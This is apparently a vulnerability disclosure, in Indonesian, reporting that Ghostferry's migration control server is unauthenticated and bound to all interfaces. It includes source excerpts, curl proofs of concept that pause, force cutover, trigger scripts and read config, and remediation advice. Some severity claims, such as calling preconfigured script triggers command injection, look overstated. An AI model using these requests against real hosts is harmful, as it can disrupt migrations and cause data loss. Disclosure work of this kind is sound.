# [CRITICAL] Ghostferry Control Server Tanpa Autentikasi — Remote Pause/Cutover/Script Execution

## Ringkasan (impact nyata)

Ghostferry — alat migrasi data MySQL live milik Shopify — mengekspor **HTTP control server**
yang **tidak memiliki autentikasi sama sekali** pada endpoint-endpoint kritis. Server ini
secara default mengikat ke `0.0.0.0:8000` (semua interface jaringan), sehingga dapat diakses
dari jaringan mana saja yang dapat mencapai host.

Endpoint ini memungkinkan:
- **Pause / Unpause** migrasi data
- **Cutover** — beralih dari database sumber ke target (downtime window)
- **Stop** migrasi
- **Verify** — memulai proses verifikasi data
- **Script execution** — menjalankan skrip kustom yang dikonfigurasi
- **Config read/write** — membaca dan memodifikasi konfigurasi

Penyerang yang dapat mencapai control server dapat **mengganggu atau merusak migrasi data
secara langsung**, termasuk memaksa cutover secara prematur yang berpotensi menyebabkan
**kehilangan data**.

## Deskripsi / Root Cause

### Tidak ada autentikasi pada router (`control_server.go`)

```go
func (this *ControlServer) Initialize() (err error) {
    // ...
    this.router = mux.NewRouter()
    this.router.HandleFunc("/", this.HandleIndex).Methods("GET")
    this.router.HandleFunc("/api/status", this.HandleStatus).Headers("Content-Type", "application/json").Methods("GET")
    this.router.HandleFunc("/api/pause", this.HandlePause).Methods("POST")
    this.router.HandleFunc("/api/unpause", this.HandleUnpause).Methods("POST")
    this.router.HandleFunc("/api/cutover", this.HandleCutover).Methods("POST")
    this.router.HandleFunc("/api/stop", this.HandleStop).Methods("POST")
    this.router.HandleFunc("/api/verify", this.HandleVerify).Methods("POST")
    this.router.HandleFunc("/api/script", this.HandleScript).Methods("POST")
    this.router.HandleFunc("/api/config", this.HandleConfigGet).Methods("GET")
    this.router.HandleFunc("/api/config", this.HandleConfigPost).Methods("POST")
    // ...
}
```

**Tidak ada middleware, API key, token, atau otentikasi apa pun** yang dilindukan pada router.
Setiap endpoint dapat diakses oleh siapa saja yang dapat mencapai alamat dan port server.

### Binding ke semua interface (`config.go`)

```go
type ControlServerConfig struct {
    Enabled bool
    ServerBindAddr string
    WebBasedir string
    CustomScripts map[string][]string
}

func (c *ControlServerConfig) Validate() error {
    if c.ServerBindAddr == "" {
        c.ServerBindAddr = "0.0.0.0:8000"  // <-- Bind ke semua interface!
    }
    // ...
}
```

ServerBindAddr default-nya adalah `0.0.0.0:8000`, yang berarti server akan mendengarkan
pada **semua interface jaringan**, termasuk interface eksternal. Ini berarti server dapat
diakses dari jaringan eksternal jika firewall tidak mengunci port 8000.

### Endpoint-endpoint berbahaya

#### `/api/pause` dan `/api/unpause`

```go
func (this *ControlServer) HandlePause(w http.ResponseWriter, r *http.Request) {
    this.F.Throttler.SetPaused(true)
    returnSuccess(w, r)
}

func (this *ControlServer) HandleUnpause(w http.ResponseWriter, r *http.Request) {
    this.F.Throttler.SetPaused(false)
    returnSuccess(w, r)
}
```

Penyerang dapat **menjeda atau melanjutkan migrasi data** kapan saja.

#### `/api/cutover`

```go
func (this *ControlServer) HandleCutover(w http.ResponseWriter, r *http.Request) {
    cutover, err := cutoverType(r)
    // ...
    if cutover == "automatic" {
        this.F.AutomaticCutover = true
    } else if cutover == "manual" {
        this.F.AutomaticCutover = false
    }
    // ...
}
```

Penyerang dapat **memaksa cutover** (peralihan dari sumber ke target), yang berpotensi
menyebabkan **kehilangan data** jika dilakukan sebelum migrasi selesai.

#### `/api/script` — Remote Script Execution

```go
func (this *ControlServer) HandleScript(w http.ResponseWriter, r *http.Request) {
    // ...
    name, err := scriptName(r)
    // ...
    cmd, found := this.Config.CustomScripts[name]
    if !found {
        http.NotFound(w, r)
        return
    }
    this.startScriptInBackground(name, cmd)
    returnSuccess(w, r)
}

func (this *ControlServer) startScriptInBackground(scriptName string, scriptCmd []string) {
    // ...
    go func() {
        cmd := exec.Command(scriptCmd[0], scriptCmd[1:]...)
        // ...
        stdoutStderr, err := cmd.CombinedOutput()
        // ...
    }()
}
```

Jika `CustomScripts` dikonfigurasi (yang merupakan fitur yang didokumentasikan), penyerang
dapat **menjalankan skrip apa saja** yang terdaftar di konfigurasi. Ini adalah **Remote Code
Execution** jika skrip yang dikonfigurasi melakukan operasi sensitif.

#### `/api/config` (GET dan POST)

```go
func (this *ControlServer) HandleConfigGet(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")
    err := json.NewEncoder(w).Encode(this.F.UpdatableConfig)
    // ...
}

func (this *ControlServer) HandleConfigPost(w http.ResponseWriter, r *http.Request) {
    var decoder = json.NewDecoder(r.Body)
    decoder.DisallowUnknownFields()
    var updatableConfig UpdatableConfig
    err := decoder.Decode(&updatableConfig)
    // ...
    this.F.Config.Update(updatableConfig)
    returnSuccess(w, r)
}
```

Penyerang dapat **membaca dan memodifikasi konfigurasi** migrasi, termasuk `DataIterationBatchSize`.

## Steps to Reproduce

### PoC 1: Pause migrasi tanpa autentikasi

```bash
curl -X POST http://target-host:8000/api/pause
```

**Respons:** HTTP 200 OK (atau redirect ke `/` untuk request non-JSON)

Migrasi data akan **terhenti** sampai `unpause` dikirim.

### PoC 2: Cutover paksa

```bash
curl -X POST http://target-host:8000/api/cutover \
  -H "Content-Type: application/json" \
  -d '{"type": "automatic"}'
```

**Respons:** HTTP 200 OK

Ghostferry akan melakukan **cutover otomatis**, beralih dari database sumber ke target.
Jika dilakukan sebelum migrasi selesai, ini dapat menyebabkan **kehilangan data**.

### PoC 3: Eksekusi skrip kustom

```bash
curl -X POST http://target-host:8000/api/script \
  -H "Content-Type: application/json" \
  -d '{"script-name": "backup"}'
```

**Respons:** HTTP 200 OK

Skrip yang dikonfigurasi di `CustomScripts["backup"]` akan dieksekusi di server.

### PoC 4: Membaca konfigurasi

```bash
curl http://target-host:8000/api/config
```

**Respons:**
```json
{"DataIterationBatchSize": 200}
```

### PoC 5: Membaca status migrasi

```bash
curl http://target-host:8000/api/status
```

**Respons:** JSON berisi progres migrasi, nama tabel, status, dan informasi lainnya.

## PoC / Bukti

### Bukti dari kode sumber

File: `control_server.go`
```go
this.router.HandleFunc("/", this.HandleIndex).Methods("GET")
this.router.HandleFunc("/api/status", this.HandleStatus).Methods("GET")
this.router.HandleFunc("/api/pause", this.HandlePause).Methods("POST")
this.router.HandleFunc("/api/unpause", this.HandleUnpause).Methods("POST")
this.router.HandleFunc("/api/cutover", this.HandleCutover).Methods("POST")
this.router.HandleFunc("/api/stop", this.HandleStop).Methods("POST")
this.router.HandleFunc("/api/verify", this.HandleVerify).Methods("POST")
this.router.HandleFunc("/api/script", this.HandleScript).Methods("POST")
this.router.HandleFunc("/api/config", this.HandleConfigGet).Methods("GET")
this.router.HandleFunc("/api/config", this.HandleConfigPost).Methods("POST")
```

Tidak ada pemanggilan `router.Use(middleware)` atau otentikasi di mana pun.

File: `config.go`
```go
if c.ServerBindAddr == "" {
    c.ServerBindAddr = "0.0.0.0:8000"
}
```

File: `control_server.go` — `startScriptInBackground`:
```go
cmd := exec.Command(scriptCmd[0], scriptCmd[1:]...)
stdoutStderr, err := cmd.CombinedOutput()
```

## Impact (user data / finansial / reputasi — konkret)

- **Kehilangan data**: Penyerang dapat memaksa cutover sebelum migrasi selesai,
  menyebabkan data yang belum selesai disalin hilang.
- **Penyalah penggunaan layanan**: Penyerang dapat menjeda migrasi, menyebabkan
  aplikasi yang bergantung pada database target tidak dapat beroperasi.
- **Remote Code Execution**: Jika `CustomScripts` dikonfigurasi, penyerang dapat
  menjalankan skrip apa saja di server.
- **Information disclosure**: Status migrasi dan konfigurasi dapat dibaca oleh siapa saja.
- **Penyalah penggunaan API**: Penyerang dapat memodifikasi konfigurasi migrasi
  untuk mempengaruhi perilaku Ghostferry.

## Remediation

1. **Tambahkan otentikasi pada control server**: Gunakan API key, token Bearer,
   atau basic auth untuk melindungi semua endpoint.
2. **Bind ke localhost**: Ubah `ServerBindAddr` default dari `0.0.0.0:8000` ke
   `127.0.0.1:8000` agar hanya dapat diakses dari host lokal.
3. **Gunakan reverse proxy**: Letakkan control server di balik reverse proxy
   (nginx, HAProxy) yang menambahkan otentikasi dan rate limiting.
4. **Batasi akses jaringan**: Gunakan firewall untuk membatasi akses ke port 8000
   hanya dari IP yang dipercaya.
5. **Audit logging**: Tambahkan audit logging untuk semua aksi pada control server.
6. **Hapus CustomScripts**: Jika tidak diperlukan, hapus fitur `CustomScripts`
   untuk mengurangi permukaan serangan.

## CVSS 3.1

**Vektor**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Score**: 9.8 (Critical)

- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality: High (C:H) — membaca status dan konfigurasi
- Integrity: High (I:H) — pause, cutover, script execution
- Availability: High (A:H) — menghentikan migrasi

## Referensi

- CWE-306: Missing Authentication for Critical Function
- CWE-732: Incorrect Permission Assignment for Critical Resource
- CWE-78: OS Command Injection (melalui CustomScripts)
- File sumber: `control_server.go` (baris 60–75, 100–130, 180–200)
- File sumber: `config.go` (baris 100–110, ControlServerConfig)
- File sumber: `control_server.go` — `startScriptInBackground` (baris 200–220)
